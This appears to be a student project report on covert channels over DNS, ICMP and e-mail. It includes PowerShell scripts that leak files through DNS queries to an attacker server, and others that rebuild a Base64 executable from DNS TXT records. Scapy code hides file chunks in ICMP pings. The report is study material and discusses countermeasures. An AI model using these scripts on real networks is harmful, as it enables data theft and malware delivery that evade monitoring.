# Hidden Communication using Covert Channels

## Authors
Mateusz Smendowski, Piotr Śladowski, Marcin Świstak

## Original Documentation
https://demo.hedgedoc.org/hBGWzQS9SP64Gk19aPXhTA?both

## 1. Introduction

<div style="text-align: justify">
Network Covert Channels are used to send information in a secret manner, so that the entire process of transferring data between the sender and recipient is defined as a hidden communication. Their applications include, but are not limited to, the stealthily control infected nodes of botnet. Regardless of the purpose of their use, which can be undoubtedly negative, communication using (mostly low-bandwidth) covert channels may resemble regular and seemingly indistinguishable network traffic. In addition, the way information is hidden is usually unknown to the network administrator, what generally causes this type of communication extremely difficult to detect, mitigate and neutralize. Therefore, the issues related to the transmission of hidden information using covert channels become undoubtedly worth exploring and implementing, especially from the perspective of secure communication systems. The addressing of the problem will include implementation of covert channels using DNS, ICMP, and email headers and analysis of the effectiveness of implemented methods (successfully sending and receiving of the original message) based on Wireshark and network traffic analysis. </br></br> Consequently, project goals are:

* presenting covert channels as a way to transfer hidden communication with an emphasis of highlighting the purpose of their practical use and ways of counteracting them,
* implementation of solutions aimed at sending hidden communication using Domain Name System, Internet Control Message Protocol and Internet Message Access Protocol, 
* validation and evaluation of the implemented methods, supported by inter alia network traffic analysis based on Wireshark.
</div> 

## 2. Background
<div style="text-align: justify">
Techniques, that are based on hiding information, are commonly practiced by attackers who want to remain unaffected by the system administrators for the longest possible time. Therefore, ubiquitous and widely-used systems and protocols can naturally become carriers of hidden information. The multitude of possibilities gives a major advantage to attackers, who by disguised of a regular network traffic, can steal data or manage infected nodes. The key factor become the successful transmission of hidden information between the sender and the recipient, who are usually located in distant networks or regions. In a consequence, one of the most popular type of covert channels is a storage covert channel which relies on embedding data into a selected medium, e.g. data can be hidden in an unused field in the header of a network protocol. Furthermore, covert channels can be characterized by dint of the following metrics: stenographic bandwidth (the quantity of hidden information that can be transferred in a given unit of the time), undetecatbility and finally the resistance of the hidden information in the process of transmission. Fundamentally, it is tremendously difficult to maximize all of these factors. Therefore, it is necessary to resemble regular network traffic as much as possible, to cause statistically unnoticeable changes in the network traffic.

Despite the fact that well-used covert channels are a huge challenge for network and system administrators, there are couple of ways to counteract them. Firstly, firewalls or intrusion detection systems can carefully and extensively monitor network traffic, taking into consideration protocols (and their data unit) that are used to communicate. Other ways are implementation or usage of tools which monitor a set of protocols in a specific framework. Such defined rules can be multi-tiered and its logic applicable for diverse type of communication. Unfortunately, complicated and extensive traffic filters (aimed on covert channel detection) can have high time and computational complexity. It is unrealistic to completely eliminate covert channels. In consequence, contremaserumets become not zero-one actions - the complete elimination of an HTTP covert channel, would have end up with elimination of the entire HTTP-based communication. In practice, the applied solutions are supervision, monitoring, minimization of attractiveness of the given covert channels (bandwidth limitation), reducing the performance of covert channel (additional noise for voice transmission - impact on hidden information's resistance). Additionally, as a proactive way, it is possible to fill unused protocol fields with padding or use of secure communication systems - the IPsec protocol can natively prevent cover channels that are based on the packet size modulation.  
</div>

---

## 3. Hidden Communication using DNS

### 3.1 Domain Name System
<div style="text-align: justify">
Domain Name System is one of the basic protocols used on the Internet [2]. It was developed in a time, when security considerations were marginally important in designing services and entire systems. Using the DNS protocol is one of the easiest ways to find out if a machine is connected to the external, global networks. If the "nslookup google.com" command returns any data, then there is a connection to the Internet on that host even if all TCP and UDP ports are blocked. On the other hand, DNS can be used as both an exfiltration and data infiltration technique. A single DNS query allows to resolve a domain name with a maximum length of 253 characters, which could allow an average of 8 english sentences to be sent in a single request [3]. It should be taken into account that the way of communication practiced by the attacker will be usually obfuscated, or binary files will be encoded e.g. in Base64. Furthermore, taking into account the redundancy of Base64 encoding, where every 3 bytes are represented by 4 bytes, one query can allow to send about 190 bytes of data. Subtracting the parts needed for the domain name, the host identifier, filename and the sequence numbers themselves (necessary to reconstruct the stream over UDP), in a summary, leaves about 100 usable bytes in a single request. The fact that UDP and DNS traffic is often not monitored, allows for conducting a slow but unsuspicious and undetectable communication. <br></br>

There are nearly 90 different DNS records. Although only a few are major, some of them can be used for unusual attack scenarios, such as the NULL record, which allows arbitrary data to be stored. *"Anything at all may be in the RDATA field so long as it is 65535 octets or less"* [2]. 

Most popular DNS types are [4]:
* A – up to 4 bytes (IPv4 address)
* AAAA – up to 32 bytes (IPv6 address)
* MX record – 2 bytes + domain name (255 bytes)
* CNAME – up to 110 bytes (Base32)
* TXT – up to 64kB (N • 220 bytes in Base64)
</div>



### 3.2 Implementation
<div style="text-align: justify">

DNS has been installed on bought VPS instance. Exposing DNS servers to the Internet poses security risks. To mitigate them, a firewall allows inboud traffic on 53/UDP only from specific source IPs. Listing 1 shows bind9 configuration that allows queries only from predefined IP/subnets.
    
```
options {
                ...
        allow-query     { localhost; vitcim_ip; };
        filter-aaaa-on-v4 yes;
        recursion yes;
        version "2021scs";

        querylog yes;
                ...
};
```

<div>
<center><i> Listing 1. Bind9 configuration file. </i></center><br>
</div>

In order to easily manage exfiltrated data, all Domain Name System queries are logged to a separate file as shown in the Listing 2.
```
logging {
          channel "misc" {
                    file "/var/log/named/misc.log";
                    print-time YES;
                    print-severity YES;
                    print-category YES;
          };

          channel "query" {
                    file "/var/log/named/query.log";
                    print-time YES;
                    print-severity NO;
                    print-category NO;
          };

          category default {
                    "misc";
          };

          category queries {
                    "query";
          };
};

zone "secure.communications" IN {
        type master;
        file "secure.communications.db";
        allow-update { none; };
        allow-query { any; };
};
```

<div>
<center><i> Listing 2. Bind9 logging options. </i></center><br>
</div>

Afterwards, to allow reverse communication, TXT records were created (Listing 3), where each of them can contain up to 255 characters. In this case, there is no need to manually reconstruct the order of the data, because of the fact that each part is contained in a separate subdomain.
```
$TTL 86400
@ IN SOA dns-primary.secure.communications. admin.secure.communications. (
                                                2021111503 ;Serial
                                                3600 ;Refresh
                                                1800 ;Retry
                                                604800 ;Expire
                                                86400 ;Minimum TTL
)

;Name Server Information
@ IN NS dns-primary.secure.communications.

;IP Address for Name Server
dns-primary IN A 123.123.123.123

;Mail Server MX (Mail exchanger) Record
secure.communications. IN MX 10

;A Record for the following Host name
www  IN   A   10.0.10.13

;CNAME Record
ftp  IN   CNAME www.secure.communications.

value1 IN TXT "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDACcb9lgAAAAAAAAAAOAAIgALATAAAD4AAAAIAAAAAAAAZlwAAAAgAAAAYAAAAABAAAAgAAAAAgA"
value2 IN TXT "BAAAAAAAAAAGAAAAAAAAAACgAAAAAgAAAAAAAAIAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAABRcAABPAAAAAGAAAMAFAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAADcWgAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AA"
value3 IN TXT "AbDwAAAAgAAAAPgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAMAFAAAAYAAAAAYAAABAAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAARgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABIXAAAAAAAAEgAAAACAAUAjDQAAPAZAAADAAIAGAAABnxOAABgDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
value4 IN TXT "AAAAAAAAAAAAAAAAAAAAAAABMwAwCjAAAAAQAAEQIfDB8McxUAAAp9AgAABAIfC40mAAABfQMAAAQCKBYAAAoAAAIDfQEAAAQXCitoAAYb/gQLBywJAhd9BAAABCtDBhsyBgYe/gQrARYMCCwJAhh9BAAABCsrBh4yBwYfCv4EKwEWDQksCQIZfQQAAAQrEgYfCv4BEwQRBCwHAhp9BAAABAJ7AwAABAYCewQAAASeAAYXWAoGHwv+BBMFEQUt"
value5 IN TXT "SoAEzAEADQAAAACAAARABcKKyUAFwsrEgJ7AgAABAcGFigXAAAKBxdYCwcfC/4EDAgt5QAGF1gKBh8L/gQNCS3SKhMwBADnAAAAAwAAEQAOBBb+AQoGLGkAFgsrLwAWDCsbAnsCAAAEAwdYF1kECFgXWR8LKBcAAAoIF1gMCAUYWP4EDQkt2wAHF1gLBxn+BBMEEQQtxxYTBSsYAnsCAAAEAwQRBVgOBSgXAAAKEQUXWBMFEQUF/gQTBhEGLd0"
value6 IN TXT "K3MAFhMHKzkAFhMIKx8CewIAAAQDEQhYF1kEEQdYF1kfCygXAAAKEQgXWBMIEQgFGFj+BBMJEQkt1AARBxdYEwcRBxn+BBMKEQotvBYTCysYAnsCAAAEAxELWAQOBSgXAAAKEQsXWBMLEQsF/gQTDBEMLd0AKgATMAEADAAAAAQAABEAAnsCAAAECisABioTMAUA8wAAAAUAABEAAnsCAAAEAwQoGAAACh8M/gEKBiwMAhh9BQAABDi1AAAAAn"
value7 IN TXT "CAAAEAwQoGAAACiwTAnsCAAAEAwQoGAAACh8L/gErARcLBywMAhZ9BQAABDiCAAAAAnsCAAAEAwQoGAAAChcyFgJ7AgAABAMEKBgAAAofCv4CFv4BKwEWDAgsVwACF30FAAAEAnsDAAAEAnsCAAAEAwQoGAAACo8mAAABJUoXWVQCewMAAAQCewIAAAQDBCgYAAAKlBb+AQ0JLBYCHwoCewIAAAQDBCgYAAAKWH0FAAAEAAJ7AgAABAMEHwwoF"
value8 IN TXT "AACgJ7BQAABBMEKwARBCoAEzADAFAAAAAAAAAAAnMZAAAKfQoAAAQCHwwfDHMVAAAKfQsAAAQCFn0MAAAEAhZ9DQAABAIoFgAACgAAAgN9BgAABAIDcxIAAAZ9BwAABAIDcwEAAAZ9CAAABCoTMAQAagAAAAYAABEAAnsGAAAEexUAAAQW/gEKBixWACs4AAJ7CgAABB8KbxoAAAoXWAsCewoAAAQfCm8aAAAKF1gMAnsLAAAEBwgoGAAAChb+"
value9 IN TXT "Q0JLAIrAwArxgJ7CwAABAcIFygXAAAKAgcIFygIAAAGAAAqAAATMAQACwIAAAcAABEABRf+AQsHOcQAAAAAAnsGAAAEexoAAARvGwAACgQXWR8KWgMXWVhvHAAACnQUAAABCgJ7BwAABAMEbw4AAAYMCBb+AQ0JLA4GcgEAAHBvHQAACgAraAgX/gETBBEELA4GKB4AAApvHwAACgArUAAGKB4AAApvHwAACgACAnsMAAAEF1h9DAAABAJ7DAA"
value10 IN TXT "BB8K/gETBREFLCQAAnsGAAAEexsAAARyBQAAcG8gAAAKAAJ7BgAABBd9FQAABAAAAnsGAAAEF30ZAAAEADg6AQAAAAJ7BgAABHscAAAEbxsAAAoEF1kfCloDF1lYbxwAAAp0FAAAAQoCewgAAAQDBG8OAAAGEwYRBhb+ARMHEQcsKQACewYAAAR7HwAABHIbAABwbyAAAAoABnIBAABwbx0AAAoAADi9AAAAEQYX/gETCBEILCkAAnsGAAAEex"

...

value97 IN TXT "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

<div>
<center><i> Listing 3. secure.commmunications DNS zone file. </i></center><br>
</div>
    
Poweshell script, used for data exfiltration, is based on example presented by Piotr Głaska on PLNOG 2020 ONLINE [4]. Firstly, Byte file is encoded into hex data and then the DNS server is seqentially queried for different subdomains (Listing 4).
```PS
$i=0;
Resolve-DnsName -Type A -DnsOnly -QuickTimeout -ErrorAction 'silentlycontinue' start.scs.kowercyjne.kanaly
Get-Content -AsByteStream -ReadCount 27 -TotalCount -1 $fname | ForEach-Object {
    $paddedhex = $text = $null;
    $bytes = $_;
    foreach ($byte in $bytes) {
        $byteinhex = [String]::Format("{0:X}", $byte);
        $paddedhex += $byteinhex.PadLeft(2,"0")
    }
    $req=$paddedhex+"."+$i+".scs.kowercyjne.kanaly";
    $i++;
    $req;
    Resolve-DnsName -Type A -DnsOnly -QuickTimeout $req -ErrorAction 'silentlycontinue'; 
}
Resolve-DnsName -Type A -DnsOnly -QuickTimeout -ErrorAction 'silentlycontinue' stop.scs.kowercyjne.kanaly;
```

<div>
<center><i> Listing 4. PowerShell script used for exfiltration. </i></center><br>
</div>

Finally, malware installed on victim operating system can retrieve payload using simple PowerShell script (Listing 5.). After that TXT records are endoced back from Base64 to binary data, what is defined as infiltration.

```PS
$outfile = "out.exe"
$base64 = ""
for ($i=1; $i -le 97; $i=$i+1 ) 
{
    $dns_value = Resolve-DnsName "value$($i).secure.communications" -Type TXT -Server DNS_server_IP;
    $txt = $dns_value.Strings
    $base64 = $base64 + $txt
    
}
$base_64_r = $base64 -replace "`t|`n|`r",""
Write-Output $base_64_r
[IO.File]::WriteAllBytes($outfile, [Convert]::FromBase64String($base_64_r))
```

<div>
<center><i> Listing 5. PowerShell script used for data infiltration. </i></center><br>
</div>
</div>

### 3.3 Validation
<div style="text-align: justify">

The results of execution of the script used for data exfiltration are shown in Figure 1 (victim side) and Listing 6 (attacker side).
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_ba4258a7bacfae6ae11e04528a033f3c.png)
    
<div>
<center><i> Figure 1. DNS queries sent from vitcim computer. </i></center><br>
</div>


```
24-Oct-2021 15:17:34.551 client @0x7f0242ea2770 victim_ip#63047 (start.scs.kowercyjne.kanaly): query: start.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:34.629 client @0x7f02400a1ca0 victim_ip#53332 (6F72656D20497073756D2069732073696D706C792064756D6D7920.0.scs.kowercyjne.kanaly): query: 6F72656D20497073756D2069732073696D706C792064756D6D7920.0.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:34.675 client @0x7f0242e939f0 victim_ip#56448 (74657874206F6620746865207072696E74696E6720616E64207479.1.scs.kowercyjne.kanaly): query: 74657874206F6620746865207072696E74696E6720616E64207479.1.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:34.726 client @0x7f0242ea2770 victim_ip#55337 (706573657474696E6720696E6475737472792E204C6F72656D2049.2.scs.kowercyjne.kanaly): query: 706573657474696E6720696E6475737472792E204C6F72656D2049.2.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:34.773 client @0x7f02400a1ca0 victim_ip#53332 (7073756D20686173206265656E2074686520696E64757374727927.3.scs.kowercyjne.kanaly): query: 7073756D20686173206265656E2074686520696E64757374727927.3.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:34.820 client @0x7f0242e939f0 victim_ip#60723 (73207374616E646172642064756D6D792074657874206576657220.4.scs.kowercyjne.kanaly): query: 73207374616E646172642064756D6D792074657874206576657220.4.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:34.869 client @0x7f0242ea2770 victim_ip#54743 (73696E6365207468652031353030732C207768656E20616E20756E.5.scs.kowercyjne.kanaly): query: 73696E6365207468652031353030732C207768656E20616E20756E.5.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:34.917 client @0x7f02400a1ca0 victim_ip#58029 (6B6E6F776E207072696E74657220746F6F6B20612067616C6C6579.6.scs.kowercyjne.kanaly): query: 6B6E6F776E207072696E74657220746F6F6B20612067616C6C6579.6.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:34.963 client @0x7f0242e939f0 victim_ip#53332 (206F66207479706520616E6420736372616D626C65642069742074.7.scs.kowercyjne.kanaly): query: 206F66207479706520616E6420736372616D626C65642069742074.7.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.011 client @0x7f0242ea2770 victim_ip#65026 (6F206D616B65206120747970652073706563696D656E20626F6F6B.8.scs.kowercyjne.kanaly): query: 6F206D616B65206120747970652073706563696D656E20626F6F6B.8.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.061 client @0x7f02400a1ca0 victim_ip#58710 (2E20497420686173207375727669766564206E6F74206F6E6C7920.9.scs.kowercyjne.kanaly): query: 2E20497420686173207375727669766564206E6F74206F6E6C7920.9.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.104 client @0x7f0242e939f0 victim_ip#63807 (666976652063656E7475726965732C2062757420616C736F207468.10.scs.kowercyjne.kanaly): query: 666976652063656E7475726965732C2062757420616C736F207468.10.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.153 client @0x7f0242ea2770 victim_ip#55059 (65206C65617020696E746F20656C656374726F6E69632074797065.11.scs.kowercyjne.kanaly): query: 65206C65617020696E746F20656C656374726F6E69632074797065.11.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.202 client @0x7f02400a1ca0 victim_ip#52262 (73657474696E672C2072656D61696E696E6720657373656E746961.12.scs.kowercyjne.kanaly): query: 73657474696E672C2072656D61696E696E6720657373656E746961.12.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.250 client @0x7f0242e939f0 victim_ip#56841 (6C6C7920756E6368616E6765642E2049742077617320706F70756C.13.scs.kowercyjne.kanaly): query: 6C6C7920756E6368616E6765642E2049742077617320706F70756C.13.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.303 client @0x7f0242ea2770 victim_ip#51727 (61726973656420696E207468652031393630732077697468207468.14.scs.kowercyjne.kanaly): query: 61726973656420696E207468652031393630732077697468207468.14.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.350 client @0x7f02400a1ca0 victim_ip#60439 (652072656C65617365206F66204C65747261736574207368656574.15.scs.kowercyjne.kanaly): query: 652072656C65617365206F66204C65747261736574207368656574.15.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.399 client @0x7f0242e939f0 victim_ip#58029 (7320636F6E7461696E696E67204C6F72656D20497073756D207061.16.scs.kowercyjne.kanaly): query: 7320636F6E7461696E696E67204C6F72656D20497073756D207061.16.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.445 client @0x7f0242ea2770 victim_ip#62247 (7373616765732C20616E64206D6F726520726563656E746C792077.17.scs.kowercyjne.kanaly): query: 7373616765732C20616E64206D6F726520726563656E746C792077.17.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.494 client @0x7f02400a1ca0 victim_ip#65026 (697468206465736B746F70207075626C697368696E6720736F6674.18.scs.kowercyjne.kanaly): query: 697468206465736B746F70207075626C697368696E6720736F6674.18.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.540 client @0x7f0242e939f0 victim_ip#59519 (77617265206C696B6520416C64757320506167654D616B65722069.19.scs.kowercyjne.kanaly): query: 77617265206C696B6520416C64757320506167654D616B65722069.19.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.587 client @0x7f0242ea2770 victim_ip#58029 (6E636C7564696E672076657273696F6E73206F66204C6F72656D20.20.scs.kowercyjne.kanaly): query: 6E636C7564696E672076657273696F6E73206F66204C6F72656D20.20.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.633 client @0x7f02400a1ca0 victim_ip#58120 (497073756D2E.21.scs.kowercyjne.kanaly): query: 497073756D2E.21.scs.kowercyjne.kanaly IN A + (server_ip)
24-Oct-2021 15:17:35.679 client @0x7f0242e939f0 victim_ip#64090 (stop.scs.kowercyjne.kanaly): query: stop.scs.kowercyjne.kanaly IN A + (server_ip)
```
    
<div>
<center><i> Listing 6. DNS queries from DNS server log file. </i></center><br>
</div>

Recovered data is shown in Figures 2 and 3. In summary, querying Domain Name System records, has been succesfully used as a carrier for hidden communication. 

![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_8f1a7910438631b99efea182c6765941.png)
<div>
<center><i> Figure 2. HEX encoded data restored from recieved queries </i></center><br>
</div>


![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_736ecd25a4fd12ad77eeccc62675c8d7.png)
</div>
<div>
<center><i> Figure 3. ASCII data restored from recieved queries </i></center><br>
</div>
---

## 4. Hidden Communication using ICMP
### 4.1 Internet Control Message Protocol
<div style="text-align: justify">
Internet Control Message Protocol is widely used for diagnostic purposes and represents a set of messages capable of error reporting, checking host reachability or connectivity beetween network nodes, which are sent with the usage of IP header [5]. As ICMP is applicable in well-known tools like PING and TRACEROUTE or even to notify routers about availability of better route to the destination, it is usually not the object of suspicious. Due to its prevalence in ICT networks, it becomes a protocol often used by attackers not only in DDoS attacks [6] but also as a carrier in covert channels, to store hidden information in payload.
</div>

### 4.2 Implementation
<div style="text-align: justify">
Hidden information can be embedded in the payload field of ICMP ECHO REQUEST message, which maximum size equals 1472 Bytes. Consequently, Scapy for Python has been used as a major tool in order to manipulate network packets and create a custom protocol data units with an influence on both network protocol stack and its headers' content. Firstly, the file devoted to be sent, is divided into data chunks, which size is intentionally random (enforcement of undetectability of covert channel) and simultaneously slighter than the maximum ICMP payload one. Listing 7 shows function used to read and divide file into chunks. 

<br>
<br>

    
```python
def read_and_fragment_file(filename: str) -> Generator[bytes, None, None]:
    if os.path.isfile(filename):
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(random.randint(io.DEFAULT_BUFFER_SIZE // 16, io.DEFAULT_BUFFER_SIZE // 12))
                if not chunk:
                    break
                yield chunk
    else:
        raise SystemExit
```
<div>
<center><i> Listing 7. Function to read file and divide it's content into data chunks. </i></center><br>
</div>

Secondly, each data chunk (more precisely a list of bytes) is encoded to the base64 transport format. In order to distinguish and ease the further reconstruction of the source file, sequence number and file identifier (constructed on the basis of its name and the source IP address) are added to the relevant data. Subsequently, using the Scapy library, ICMP packets are sequentially constructed. At this stage, it is necessary to define the source and destination IP addresses. Summarizing, the payload consists of a part of the source file additionally enriched with a sequence number and its identifier (Listing 8).


```python
def create_icmp_packet(data: str, source: str, destination: str) -> IP:
    return IP(src=source, dst=destination) / ICMP() / f"{data}"
```
<div>
<center><i> Listing 8. Function to create a complete ICMP packet with specified data. </i></center><br>
</div>

Afterwards, previously constructed packets are placed in the buffer and then sent to the indicated network destination. Due to the fact that communication using covert channels should resemble the regular network traffic, the implemented solution supports the definition of the time interval between sending subsequent ICMP ECHO REQUEST messages, as shown in listing number 9.

```python
async def send_icmp_packets(buffer: List[IP], interval: int) -> None:
    for icmp_packet in buffer:
        send(icmp_packet)
        await asyncio.sleep(interval)
```
<div>
<center><i> Listing 9. Function to send ICMP packets in a regular network traffic manner. </i></center><br>
</div>

Receiving ICMP messages comes to listening on a properly described network socket. Knowing the sizes of the IP and ICMP headers, the received packets can be decoded in order to retrieve a hidden information from sender (Listing 10).

```python     
ICMP_PACKET = {
    "IP_HEADER_SIZE": 20,
    "ICMP_HEADER_SIZE": 8,
    "MAX_ICMP_PAYLOAD_SIZE": 1472
}

def listen_on_icmp_socket(icmp_socket: socket.socket):
    while True:
        data = icmp_socket.recv(sum(ICMP_PACKET.values()))

        ip_header = data[:ICMP_PACKET["IP_HEADER_SIZE"]]
        source_ip = get_dotted_decimal_ip_address(unicode_ip_address=ip_header[-8:-4])
        destination_ip = get_dotted_decimal_ip_address(unicode_ip_address=ip_header[-4:])

        payload = data[ICMP_PACKET["IP_HEADER_SIZE"] + ICMP_PACKET["ICMP_HEADER_SIZE"]:]

        decode_payload(payload=payload)
```
    
<div>
<center><i> Listing 10. Function to listen on ICMP socket and retrieve messages.' payload. </i></center><br>
</div>

```python
def decode_payload(payload: bytes):
    splitted_payload = str(payload, "utf8").split(":")
    
    file_chunk = str(base64.b64decode(splitted_payload[0]), "utf-8")
    sequence_number = int(splitted_payload[1])
    file_identifier = str(base64.b64decode(splitted_payload[2]), "utf-8")
    
    print(file_chunk)
```
    
<div>
<center><i> Listing 11. Function to decode and print received data chunk in UTF-8 format. </i></center><br>
</div>

Listing 12 shows an exemplary ICMP packet structure, constructed using Scapy with embedded data as message's payload.
```
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     =
  frag      = 0
  ttl       = 64
  chksum    = None
  src       = 127.0.0.1
  dst       = 127.0.0.1
  \options   \
###[ ICMP ]###
     type      = echo-request
     code      = 0
     chksum    = None
     seq       = 0x0
     unused    = ''
###[ Raw ]###
        load      = 'Y3RldHVyIHZvbHVwdGF0ZW0gbWFnbmFtIGRvbG9yIG51bXF1YW0uIEFkaXBpc2NpIG5l
        cXVlIG5lcXVlIHF1YWVyYXQgdm9sdXB0YXRlbSB2ZWxpdCBub24uIE1vZGkgcXVhZXJhdCBhbWV0IHV0I
        GFkaXBpc2NpIHZvbHVwdGF0ZW0uIE1vZGkgZG9sb3Igbm9uIGlwc3VtLiBBZGlwaXNjaSBzaXQgbGFib3
        JlIGRvbG9yZW0uVGVtcG9yYSBtYWduYW0gZWl1cyBhZGlwaXNjaSBlaXVzIGV0aW5jaWR1bnQgc2VkIHV
        0LiBVdCBkb2xvcmUgbmVxdWUgZG9sb3JlbS4gQW1ldCBhbWV0IG1hZ25hbSBxdWFlcmF0IG1hZ25hbSB1
        dCBwb3JybyBldGluY2lkdW50LiBRdWlxdWlhIGVpdXMgYWxpcXVhbSBtb2RpLiBOZXF1ZSB0ZW1wb3JhI
        G1vZGkgZG9sb3JlIHNpdCBhZGlwaXNjaSBxdWlxdWlhLg==:0008:MTI3LjAuMC4xOnNhbXBsZS50eHQ='
```
</div>
<div>
    <center><i> Listing 12. Example ICMP packet in Python script.</i>
</div>

### 4.3 Validation
<div style="text-align: justify">
    
As an example, the hidden information can be a file with dummy content (lorem ipsum) generated using a script show in Listing 13.
```python
import lorem

with open('sample.txt', "w") as file:
    file.write(("".join([lorem.text() for _ in range(3)])).replace("\n", ""))
    file.close()
```
<div>
<center><i> Listing 13. Fuction to generate text file with dummy content. </i></center><br>
</div>
    
Its size equals 4.34 KB and can be easily checked with powershell's command line function: <br> `Write-Host((Get-Item '.\sample.txt').length/1KB)`

    
    
In order to use ICMP for the hidden communication purposes (Figure 4), it is required to specify the input filename, the destination IP address and the transmission time interval between subsequent packets. As a result of executing the script, the sample file, has been divided into eight data chunks and each of them has been send as a payload in separate ICMP ECHO REQUEST messages: <br>
    
    
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_a3cdff6c6a949c6454c731994b55c932.png)

<div>
<center><i> Figure 4. Result of execution of icmp.py script. </i></center><br>
</div>

ICMP transmission can be sniffed using Wireshark and the final results of caputred packets is shown in Figure 5. <br>
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_c66f19625a9e4de6e95b9cedc797707b.png)

<div>
<center><i> Figure 5. ICMP traffic in Wireshark. </i></center><br>
</div>

Afterwards, on the next level of granularity, each ICMP ECHO REQUEST can be inspected (Figure 6). It is easily noticed that such message contains hidden, encoded data. <br>
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_328020bb500da13aed3c9c7d15e36aea.png)
    
<div>
<center><i> Figure 6. ICMP packet with custom payload seen in Wireshark. </i></center><br>
</div>

Encoded data in Base64 format representation is shown in Figure 7. <br>
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_03f7f261484d015fcb9e367074d23184.png)

<div>
<center><i> Figure 7. ICMP paylod seen in Wireshark. </i></center><br>
</div>


To verify the correct operation of the implemented solution, data can be succesfully decoded from Base64 to ASCII (Figure 8). <br>
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_30c045463fbc58f7c19371d39ecf64c4.png)
    
<div>
<center><i> Figure 8. ICMP decoded paylod seen in Wireshark. </i></center><br>
</div>

Finally, entire file, contained in the sequentially received ICMP packets, can be decoded and then succesfully assembled (Listing 14). <br>
<!-- ![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_3af31795bfe150c21d99243855fe7b9a.png) -->
</div>

```
PS C:\Users\---\hidden-communication-using-covert-channels> python .\icmp_listener.py
Labore non etincidunt dolore consectetur quaerat. Labore numquam non consectetur est. Ipsum tempora quaerat non numquam. Porro quiquia modi numquam numquam sit eius velit. Amet numquam tempora eius adipisci porro. Neque dolorem numquam dolore tempora magnam. Ipsum amet neque numquam. Quaerat porro etincidunt amet numquam amet quiquia. Neque numquam quiquia labore voluptatem consectetur.Modi magnam ipsum velit amet neque numquam. Etincidunt amet dolore aliquam quisquam. Modi sed quiquia adipisci 
aliquam etincidunt porro. Adipisci amet adipisci magnam numquam quiquia etincidun
t aliquam. Numquam neque dolor non sed ut labore dolor. Porro quisquam quiquia sit labore numquam ipsum. Aliquam tempora adipisci amet quaerat consectetur. Magnam quaerat labore porro porro porro ut. Porro ut eius magnam. Sed porro dolore consectetur ipsum.Tempora dolor tempora magnam quaerat est consectetur amet. Eius magnam neque dolorem tempora. Neque quisquam quisquam 
est ut dolor non quisquam. Eius sit dolor voluptatem modi. Tempora dolore modi tempora consectetur. Ipsum dolor sed non voluptatem amet dolore.Dolor magnam quisquam eius voluptatem dolor. Ut ipsum non est eius velit dolorem velit. Sed est magnam quaerat dolorem. Neque amet tempora modi labore voluptat    
```
    
<div>
<center><i> Listing 14. Recovered text file after transmission over TCP - first two chunks.</i></center><br>
</div>

## 5. Hidden Communication using e-mail
### 5.1 Internet Message Access Protocol
<div style="text-align: justify">
Internet Message Access Protocol [8] is widely used to manipulate and receive e-mail messages. By default, IMAP does not use encryption, but there exists an enhanced version named IMAP over SSL/TLS (IMPAS). <br><br>

